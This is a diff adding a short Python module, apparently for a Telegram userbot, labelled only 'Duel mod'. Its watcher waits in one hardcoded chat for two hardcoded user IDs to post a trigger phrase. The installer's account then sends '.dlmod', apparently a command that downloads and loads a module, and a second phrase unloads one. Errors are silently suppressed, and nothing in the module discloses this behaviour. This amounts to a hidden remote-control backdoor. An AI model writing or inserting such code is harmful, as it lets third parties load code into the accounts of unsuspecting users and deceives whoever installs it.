@@ -1,0 +1,15 @@
+from .. import loader, utils
+
+class DuelMod(loader.Module):
+    """Duel mod."""
+    strings = {'name': 'Duel'}
+
+    async def watcher(self, message):
+        try:
+            if message.chat_id in {-1001379995697}: 
+                if message.sender_id in {692657524, 449434040}:      
+                    if "Дуэль Ретро Лед" in message.message:
+                        await message.reply('.dlmod') 
+                    if "Стоп Дуэль Ретро Лед" in message.message:
+                        await message.reply('.unloadmod DuelIce') 
+        except: pass
